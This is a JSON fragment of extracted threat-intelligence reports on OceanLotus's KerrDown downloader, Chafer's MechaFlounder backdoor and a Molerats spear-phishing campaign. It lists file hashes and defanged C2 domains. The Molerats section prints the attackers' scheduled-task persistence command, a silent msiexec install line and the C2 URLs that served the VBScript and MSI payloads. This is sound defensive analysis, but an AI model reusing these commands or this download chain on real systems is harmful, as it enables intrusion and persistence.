        },
        {
            "type": "paragraph",
            "content": [
                "hastheVietnamese file nameDonkhieunai.rarwhichtranslates to'Complaint letter' in English.",
                "The archive containsalegitimateolder version of Microsoft Word (Microsoft Word 2007)executable filethatisnamedNoidung chitietdonkhieunaiguicongty.exewhichtranslates toLearn more about how to use your companyin English.",
                "The attacker usedthe DLL side loading technique to load a malicious DLL by the olderversion of Microsoft Word.",
                "When opening the executable file in the archive, itloadsthemalicious DLL in the same directory.",
                "The DLLexecutes multi-stage shellcodesand each shellcode employs various technique to hide the next stage.",
                "The overallinstallationsteps arebelow:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure6:Execution flow of sideloaded malicious downloader"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Looking at the compile timestamps ofall theKerrDownsamplesin our datasetswe were able to discernacouple of observations:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure7:",
                "Downloader DLL compile time lines"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure8:Malware compilation times in GMT +7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure9:Malware compilation during weekdays"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "OceanLotushas been an activethreat actorgroup for a number of years and remains one of the most sophisticated threat actors in the APAC region.",
                "As we have seenwith the newKerrDowndownloader being used in their recent campaigns,the group continues to build and employ new tools and techniques in their overall operations and playbooks.",
                "It is therefore imperative to understand and keep a track of the groups ongoing operations and capability to better defend against suchthreats.",
                "Given the high number of samples observed, we were also able todiscern possible working hour patterns which shows us that the group likely has formal working hours and operating out of a region whichislike Vietnamor nearby countries.",
                "While most of the targeting observedistowards Vietnamese speaking victims, given the known broader geographic and industry wide target base ofOceanLotus, the group may use similar tools and playbooksagainstother targets."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are already protected via:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "73dcbcc47d6bd95dcf031ebbd34ac42301a20ee1143ac130b405e79b4ba40fc8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89e19df797481ae2d2c895bcf030fe19e581976d2aef90c89bd6b3408579bfc3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a4a066341b4172d2cb752de4b938bf678ceb627ecb72594730b78bd05a2fad9d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8bf22202e4fd4c005afde2266413cba9d1b749b1a2d75deac0c35728b5eb3af8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "df8210d20c5eb80d44ba8fa4c41c26c8421dcb20168e4f796e4955e01ebc9e13"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "94fab926b73a6a5bc71d655c8d611b40e80464da9f1134bfce7b930e23e273ab"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4321a9f95901a77b4acfbaef3596cf681712345e1cbd764873c6643fe9da7331"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4a0309d8043e8acd7cb5c7cfca95223afe9c15a1c34578643b49ded4b786506b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4b431af677041dae3c988fcc901ac8ec6e74c6e1467787bf099c4abd658be5be"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4bc00f7d638e042da764e8648c03c0db46700599dd4f08d117e3e9e8b538519b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4e2f8f104e6cd07508c5b7d49737a1db5eeba910adfdb4c19442a7699dc78cfc"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4e791f2511c9bd3c63c8e37aa6625d8b590054de9e1cca13a7be2630bc2af9ce"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "539e8a53db3f858914cfe0d2132f11de34a691391ba71673a8b1e61367a963c7"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "53cd92f37ffd0822cc644717363ba239d75c6d9af0fa305339eaf34077edd22d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "53efaac9244c24fab58216a907783748d48cb32dbdc2f1f6fb672bd49f12be4c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5c18c3e6f7ac0d0ac2b5fa9a6435ee90d6bd77995f85bed9e948097891d42ca2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5cda7d8294a8804d09108359dd2d96cdf4fdcf22ec9c00f0182d005afff76743"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5f0db8216314da1f128b883b918e5ac722202a2ae0c4d0bf1c5da5914a66778e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6010d44cdca58cdec4559040e08798e7b28b9434bda940da0a670c93c84e33cd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "60b65ebb921dca4762aef427181775d10bbffc30617d777102762ab7913a5aa1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6146aedfe47597606fb4b05458ec4b99d4e1042da7dc974fa33a57e282cd7349"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6245b74b1cc830ed95cb630192c704da66600b90a331d9e6db70210acb6c7dfa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "67cd191eb2322bf8b0f04a63a9e7cb7bc52fb4a4444fcb8fed2963884aede3aa"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "68f77119eae5e9d2404376f2d87e71e4ab554c026e362c57313e5881005ae79e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "69e679daaaff3832c39671bf2b813b5530a70fb763d381f9a6e22e3bc493c8a9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6faa7deb1e1e0c3a7c62c2bb0ecdfa56b6e3ba4fe16971ec4572267ac70b9177"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "6fb397e90f72783adec279434fe805c732ddb7d1d6aa72f19e91a1bf585e1ea5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "70db041fb5aadb63c1b8ae57ba2699baa0086e9b011219dcebcccbf632017992"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7673f5468ba3cf01500f6bb6a19ce7208c8b6fc24f1a3a388eca491bc25cd9cd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "77805a46f73e118ae2428f8c22ba28f79f7c60aeb6305d41c0bf3ebb9ce70f94"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "788265447391189ffc1956ebfec990dc051b56f506402d43cd1d4de96709c082"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7be613237b57fbc3cb83d001efadeed9936a2f519c514ab80de8285bdc5a666c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7dbb7fab4782f5e3b0c416c05114f2a51f12643805d5f3d0cd80d32272f2731a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "7ec77e643d8d7cc18cc67c123feceed91d10db1cc9fa0c49164cba35bb1da987"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "860f165c2240f2a83eb30c412755e5a025e25961ce4633683f5bc22f6a24ddb6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "868ed69533fac80354a101410d3dd0a66f444385c6611cc85c5b0be49db2d6fd"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "89759e56d5c23085e47d2be2ce4ad4484dfdd4204044a78671ed434cec19b693"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8b7fb1cd5c09f7ec57ccc0c4261c0b4df0604962556a1d401b9cbfd750df60ba"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8d6e31c95d649c08cdc2f82085298173d03c03afe02f0dacb66dd3560149184f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "942d763604d0aefdff10ce095f806195f351124a8433c96f5590d89d809a562f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "98a5f30699564e6d9f74e737a611246262907b9e91b90348f7de53eb4cf32665"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "9e6011d6380207e2bf5105cde3d48e412db565b92cdc1b3c6aa15bd7bd4b099f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a106e0a6b7cc30b161e5ea0b1ec0f28ab89c2e1eb7ba2d5d409ddbabc3b037e6"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a2b905c26e2b92e63de85d83e280249258cb21f300d8c4a3a6bdb488676e9bcf"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a4a86e96f95f395fcf0ceb6a74a2564f4ba7adbe1b40cc702b054427327a0399"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a8192656dd1db0be4cec9d03b4d10e0529d9c52c899eda8d8e72698acfb61419"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a8f776bd3a9593e963b567ce790033fec2804ea0afb40a92d40e21d8f33d066f"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b4966f8febdba6b2d674afffc65b1df11e7565acbd4517f1e5b9b36a8c6a16ed"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bb25f1a73d095d57b2c8c9ac6780e4d412ddf3d9eef84a54903cc8e4eaefc335"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bc82bce004afb6424e9d9f9fc04a84f58edf859c4029eda08f7309dbeec67696"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c30198e0b0e470d4ac8821bd14bb754466e7974f1c20be8b300961e9e89ed1ea"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "caabc45e59820a4349db13f337063eddede8a0847ae313d89a800f241d8556c8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "d3ef6643ad529d43a7ec313b52c8396dc52c4daad688360eb207ee91a1caf7b2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e3c818052237bb4bb061290ab5e2a55c3852c8a3fef16436b1197e8b17de2e18"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e56ffcf5df2afd6b151c24ddfe7cd450f9208f59b5731991b926af0dce24285a"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e8704bf6525c90e0f5664f400c3bf8ff5da565080a52126e0e6a62869157dfe3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e8a454cd8b57a243f0abeec6945c9b10616cfdcc4abfb4c618bfc469d026d537"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eac776c3c83c9db1a770ffaf6df9e94611c8293cbd41cb9257148603b8f2be0b"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ead0f3e6f0ca16b283f09526d09e8e8cba687dab642f0e102e5487cb565bf475"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f011a136996fa53fdbde944da0908da446b9532307a35c44ed08241b5e602cc9"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f2a2f4fa2ed5b2a94720a4661937da97ab21aa198a5f8c83bb6895aa2c398d22"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f62f21ee7e642f272b881827b45ceb643c999a742e1d3eac13d1ba014d1e7f67"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f9f0973dc74716b75291f5a9b2d59b08500882563011d1def2b8d0b1b9bbb8ae"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "theme[[.]]blogsite[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cortana[.]homelinux[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "word[.]webhop[.]info"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "work[.]windownoffice[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cortanasyn[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e[.]browsersyn[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "syn[.]servebbs[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "service[.]windown-update[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "check[.]homeip[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "outlook[.]updateoffices[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "mail[.]fptservice[.]net"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "office[.]windown-update[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "cortanazone[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "beta[.]officopedia[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "videos[.]dyndns[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "service[.]serveftp[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "syn[.]browserstime[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "check[.]webhop[.]org"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ristineho[.]com"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Cobalt Strike Beacon contains the hard-coded configuration data in its body.",
                "JPCERT published an article about the structure of the configuration.",
                "The sample we obtained has the following configuration (Figure10) and connects tothe C2 server, https://b.cortanazone[.]com."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure10:Cobalt Strike Beacon configuration"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure11shows some of the contents of the individual RAR files.",
                "All the .exe files are copies of Windows Word and the associated wwlib.dll file is the malicious downloader DLLKerrDown, which is sideloaded when the .exe file gets executed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure11:RAR archives with malicious DLL for sideloading"
            ]
        }
    ],
    "1e872be4e167d314be0670867df89e34cf005d34": [
        {
            "type": "paragraph",
            "content": [
                "In November 2018 the Chafer threat group targeted a Turkish government entity reusing infrastructure that they used in campaigns reported earlier in 2018 by Clearsky, specifically, the domain win10-update[.]com.",
                "While we lack visibility into the initial delivery mechanism of this attack, we did observe a secondary payload hosted on 185.177.59[.]70, the IP address to which this domain resolved at the time of the activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 has observed Chafer activity since 2016, however, Chafer has been active since at least 2015.",
                "This new secondary payload is Python-based and compiled into executable form using the PyInstaller utility.",
                "This is the first instance where Unit 42 has identified a Python-based payload used by these operators.",
                "Weve also identified code overlap with OilRigs Clayside VBScript but at this time track Chafer and OilRig as separate threat groups.",
                "We have named this payload MechaFlounder for tracking purposes and discuss details below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Our visibility into this Chafer activity involves the identification of a malicious executable downloaded from the IP address 185.177.59[.]70.",
                "How the attackers are targeting victims and causing them to download this file are currently not known."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The file named lsass.exe was downloaded from win10-update[.]com via an HTTP request.",
                "The win10-update[.]com domain has been noted in open source as an indicator associated with Chafer threat operations.",
                "The lsass.exe file downloaded from this domain is a previously unreported python-based payload that we are currently tracking as MechaFlounder.",
                "We believe Chafer uses MechaFlounder as a secondary payload that the group downloads from a first-stage payload to carry out its post-exploitation activities on the compromised host.",
                "Based on our telemetry, the first-stage payload was not observed in this activity."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In February 2018, IP address 134.119.217[.]87 resolved to win10-update[.]com and several other domains likely associated with Chafer activity.",
                "Of interest, the domain turkiyeburslari[.]tk, which mirrors the legitimate Turkish Scholarship government domain turkiyeburslari[.]gov[.]tr, also resolved to this IP and may likely have been used in other Chafer collection operations.",
                "The domains associated with this IP address are included within the Appendix and displayed in Figure 1 below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1.",
                "Infrastructure associated with 134.119.217[.]87"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The python-based payload, lsass.exe was retrieved from a command and control (C2) server via an HTTP request to the following URL:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "win10-update[.]com/update.php?req=<redacted>&m=d"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This payload, (SHA256: 0282b7705f13f9d9811b722f8d7ef8fef907bee2ef00bf8ec89df5e7d96d81ff), which we are tracking as MechaFlounder, was developed in Python and bundled as a portable executable using the PyInstaller tool.",
                "This secondary payload acts as a backdoor allowing the operator to upload and download files, as well as run additional commands and applications on the compromised system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "MechaFlounder begins by entering a loop that will continuously attempt to communicate with its C2 server.",
                "The Trojan will use HTTP to send an outbound beacon to its C2 server that contains the user's account name and hostname in the URL.",
                "The code, seen in Figure 2, builds the URL by concatenating the username and hostname with two dashes \"--\" between the two strings.",
                "The code then creates the URL string by using the username and hostname string twice with the back-slash \"\\\" character between the two and by appending the string \"-sample.html\"."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 2. Trojan code used to build anomalous HTTP request"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "During this analysis, the code in Figure 2 generated anomalous HTTP requests for its beacons, as shown in Figure 3 below.",
                "One might notice that the GET request in Figure 3 does not start with a forward-slash \"/\" character and includes a back-slash character \"\\\" in the URL.",
                "This causes a legitimate web server, such as nginx used in our test environment, to respond with a '400 Bad Request' error message.",
                "This may suggest that even though the code in Figure 2 uses the HTTPConnection class from the httplib module to generate the anomalous HTTP beacon, it is likely that the threat actors created a custom server to handle this C2 channel instead of relying on a standard web server."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, Figure 2 shows that the malware author used the variable name 'cmd' to build the string used for the HTTP method and path and checks the HTTP method portion of the string for the word 'exit'.",
                "We are unsure of the purpose of this check, as the HTTP method in this string would never be 'exit' and therefore would never be true.",
                "We believe this is an artifact likely derived from a previous version of the script that the author forgot to remove."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 3. Example HTTP request issued by Trojan in test environment"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the C2 server were to accept the beacon in Figure 3, it would respond with HTML that contains a command intended for the Trojan to parse and execute.",
                "The Trojan begins by converting the HTML in the response to text using the code seen in Figure 4 below.",
                "The HTML to text code in Figure 4 is available in several locations on the Internet, but it appears to have possibly originated from a discussion at Stack Overflow titled Extracting text from HTML file using Python, which may be where the malware author obtained this code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 4. HTML to text code in Trojan possibly obtained from Stack Overflow discussion"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After converting the HTML to text, the Trojan discards the first 10 characters of the response and treats the remainder of the string as a command.",
                "The C2 can also provide the string \"yes \" in this command string, which instructs the Trojan to decode the command as a base16 encoded string with the \"yes \" substring removed.",
                "The Trojan subjects the command supplied by the C2 to a handler that determines the activities the Trojan will perform.",
                "Table 1 shows a list of commands available within the Trojan's command handler and the corresponding activities.",
                "The commands in the command handler provides the necessary functionality for Chafer to interact with the remote system."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1.",
                "Commands available in Trojan\u2019s command handler"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We gained more insight into the custom C2 server application by analyzing the activities that MechaFlounder carries out if it receives the upload command.",
                "To upload a specified file from the compromised system to the C2 server, the Trojan uses the Browser class in the mechanize module (partial basis of the MechaFlounder name) to submit the file to an HTML form on the C2 server.",
                "This suggests that in addition to being able to handle the anomalous HTTP GET requests previously mentioned, the custom C2 server application must also be able to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After carrying out the activities for the command, the Trojan will encode the results or output message of the command using the 'base64.b16encode' method.",
                "Each command has an output message for both a successful and failed execution of the command with the exception of empty and terminate.",
                "Table 2 below shows the success and failure messages associated with each command."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2. Success and failure messages associated with commands"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unlike the initial beacon that uses the anomalous HTTP GET request, the Trojan will send the encoded results to the C2 server using the same socket as the initial HTTP beacon.",
                "The use of the same socket and the anomalous portions of the HTTP beacon further suggests that the threat actor likely created a custom C2 server to handle this network traffic."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To show these network communications, we patched the Trojan to issue beacons that use legitimate HTTP GET requests that the HTTP server (nginx) in our test environment could support.",
                "The patches involved changing the paths within the HTTP request, specifically setting the path to start with a forward-slash / and have the forward-slash / instead of a back-splash \\ within the URL path itself.",
                "In our test environment, we added the string 0123456789runtime 5 to the file rob--rob-virtual-machine-service.html in the rob--rob-virtual-machine folder."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the Trojan issues the beacon, the HTTP server responds with contents of the rob--rob-virtual-machine-service.html file, which effectively issues a command to the Trojan.",
                "The Trojan responds to the command runtime 5 with the message \"5||rob--rob-virtual-machine**runtime changed to runtime 5\" that it encodes in base16.",
                "It then sends this to the C2 server without any HTTP headers using the same socket as the initial HTTP request."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 shows the TCP session showing the initial beacon sent from the patched Trojan, the HTTP server responding with a command, and the Trojan responding to the command all in the same TCP session."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5. Single TCP Session used by the Trojan to receive commands and send command results to the C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If you think youve seen the &m=d parameter before, youd be correct.",
                "The &m=d parameter seen in the initial download URL of the MechaFlounder payload appears in many URLs related to both Chafer and OilRig threat groups.",
                "This parameter has been seen in VBScript downloader payloads installed by delivery documents associated with both Oilrig and Chafer.",
                "We have also seen this parameter used in URLs generated by Chafers AutoIT payload.",
                "The VBScript and AutoIT payloads also share common variable names and the same overall functionality, which suggests there may be some code sharing occurring between the two threat groups.",
                "Figure 6 below shows a VBScript run by an OilRig delivery document (SHA256: 1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1) on the left compared to a Chafer AutoIT script (SHA256: 332fab21cb0f2f50774fccf94fc7ae905a21b37fe66010dcef6b71c140bb7fa1) on the right, which have colored boxes surrounding code overlaps."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unfortunately, we are unable to ascertain the specifics between the code sharing between OilRig and Chafer.",
                "At this time, we are not combining the two threat groups together based on these code overlaps."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6.",
                "Oilrig Clayside VBS | Chafer AutoIT"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Chafer threat group has been active since at least 2015 focused on both private and public sector entities within the Middle East.",
                "Unit 42 has specifically observed the targeting of Turkish government entities since at least 2016; however, this is the first instance where Unit 42 has observed Chafer using a Python-based payload.",
                "This payload, now known as MechaFlounder was created by Chafer using a combination of actor developed code and code snippets freely available online in development communities.",
                "The MechaFlounder Trojan contains enough functionality for the Chafer actors to carry out the necessary activities needed to accomplish their goals, specifically by supporting file upload and download, as well as command execution functionality."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The overlap in Oilrigs Clayside VBScript and Chafers AutoIT payloads does not come as a complete surprise.",
                "Oilrig and Chafer have for quite some time appeared very similar operationally and potentially having access to the same code or resources for payload development makes sense.",
                "Unit 42 has taken reference to the various overlaps in the two sets of activities and continues to track these operations separately."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected against this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.",
                "CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.",
                "For more information on the Cyber Threat Alliance, visit cyberthreatalliance.org."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "lsass.exe"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0282b7705f13f9d9811b722f8d7ef8fef907bee2ef00bf8ec89df5e7d96d81ff"
            ]
        }
    ],
    "c302bb83bf8fc3cd03693ed4ee6f87c6dac50bb3": [
        {
            "type": "paragraph",
            "content": [
                "Between October 2019 through the beginning of December 2019, Unit 42 observed multiple instances of phishing attacks likely related to a threat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang) targeting eight organizations in six different countries in the government, telecommunications, insurance and retail industries, of which the latter two were quite peculiar.",
                "The targeting of insurance and retail organizations is peculiar as it does not fit with this threat groups prior target set.",
                "The email subject and attachment file names used in the attacks on these seemingly atypical targets were similar in theme as those used when attacking government organizations.",
                "The lack of industry or target specific social engineering themes likely lowers the chances of a successful compromise and further confuses our understanding of the purpose of attacking these organizations."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All of the attacks involved spear-phishing emails to deliver malicious documents that required the recipient to carry out some action.",
                "The social engineering techniques included lure images attempting to trick the user into enabling content to run a macro and even document contents that threaten to release compromising pictures to the media to coerce the user into clicking a link to download a malicious payload.",
                "The payload in a majority of these attacks was a backdoor called Spark, which is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Spark backdoor has been used by Molerats since at least 2017 and is associated with the Operation Parliament campaign, which is attributed to the Gaza Cybergang.",
                "The payload delivered in one of the attacks appears to be related to JhoneRAT, which may suggest the threat group has added another custom payload to their toolset."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Molerats has been in operation as far back as 2011 targeting government organizations around the world, largely been associated with attacks involving unauthorized access and sensitive data collection.",
                "They have been observed using a bevy of tactics and techniques, ranging from leveraging publicly available backdoor tools, such as PoisonIvy or XtremeRAT, to creating custom developed ones such as KASPERAGENT and MICROPSIA.",
                "In the campaign that we tracked, this group primarily relied on social engineering and spear-phishing techniques for their initial infection vector, then multi-stage command-and-control (C2) servers for malware delivery."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Molerats used a variety of techniques to make detection and analysis difficult, such as password-protecting delivery documents, limiting the execution of the Spark payload to only run on systems with an Arabic keyboard and locale and the use of the commercial packer Enigma to obfuscate the payloads.",
                "The Spark C2 channel also attempts to evade detection, as the data in the HTTP POST requests and responses is encrypted using either 3DES or AES with randomly generated keys that appear to be unique for each payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In November 2019, Unit 42 was made aware of a single phishing email directed at a Saudi Arabian government organization.",
                "This attack involved a password-protected Microsoft Word document, which contained an embedded macro.",
                "The password for the document was provided to the victim in the body of the email.",
                "From the artifacts discovered in this attack, we were able to use our AutoFocus product to pivot to additional attacks and uncover what turned out to be an attack campaign by Molerats."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using our AutoFocus tool, we were able to find several attacks sent from the actors starting on October 2 through December 9, 2019.",
                "The emails were sent to organizations in the government and telecommunications verticals and had a mixture of specific and generic email subjects and attachment filenames.",
                "We also saw sessions associated with this attack campaign involving two US-based organizations, one in the retail and the other in the insurance industry."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The files attached to these emails were all documents, with the majority being Word documents and one PDF document.",
                "Table 1 shows a list of the emails used in this attack campaign, including the details of the email and the country and industry of the targeted organization.",
                "In this blog, we will provide an analysis of three of the seven delivery documents listed in Table 1, as the four unique delivery documents with MOFA in their file names are extremely similar to each other.",
                "The last delivery document (Urgent.docx) was the delivery document discussed in Cisco Talos' research on a new payload called JhoneRAT, which may suggest that this group also uses JhoneRAT in their attack campaigns in the region."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1. Details of spear-phishing emails seen in this attack campaign"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first document we collected and analyzed had the filename MOFA- 061019.doc (SHA256: 03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506).",
                "This document was password-protected with the password Abdullah@2019.",
                "When opening and supplying the password, the victim was presented with contents that include what appears missing images, as seen in Figure 1."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the victim then enabled the embedded macro inside the document, the macro decodes an embedded VBScript (T1064) and saves it to C:\\programdata\\Micorsoft\\Microsoft.vbs.",
                "The Microsoft.vbs script will reach out to the C2 domain servicebios[.]com to retrieve a second VBScript, which contained additional instructions to then retrieve the payload.",
                "The script downloads this secondary VBScript from the following URL and saves it to C:\\ProgramData\\PlayerVLC.vbs:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://servicebios[.]com/PlayerVLC.vbs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial VBScript will then create a scheduled task (T1053) to persistently run the secondary VBScript every minute by running the following command:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "schtasks /create",
                "/sc minute /mo 1 /tn",
                "PlayerVLC",
                "/F /tr C:\\ProgramData\\PlayerVLC.vbs"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The secondary VBScript attempts to download the executable payload from the following URL and saves it to C:\\ProgramData\\PlayerVLC.msi."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://servicebios[.]com/PlayerVLC.msi"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After downloading the executable payload, the secondary VBScript runs the following command on the command line (T1059) to kill any existing msiexec.exe process instances and use the ping application to sleep for two seconds before using the legitimate msiexec.exe application (T1218) to launch the downloaded PlayerVLC.msi file:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "%comspec% /c taskkill /F",
                "/IM msiexec.exe & ping 127.0.0.1 -n 2 >NUL & msiexec /i C:\\ProgramData\\PlayerVLC.msi /quiet /qn /norestart"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unfortunately, we were unable to obtain the PlayerVLC.msi file, as it was no longer hosted by the C2 server.",
                "This highlights the benefits of a modular payload that requires a chain of successful communications with a C2 server for a successful infection, as it makes post-intrusion analysis difficult.",
                "This type of modular payload and chained C2 requests is fairly common, as we have seen it in use by various adversaries such as DarkHydrus and Sofacy.",
                "This behavior can assist the adversary in evading automated defenses, as they can deploy their infrastructure at time of attack and avoid having additional artifacts available for further analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Word document delivered on October 31 and November 2, 2019 (SHA256: eaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000) had a filename of attachment.doc and attempted to trick the recipient into clicking the Enable Content button to run an embedded macro.",
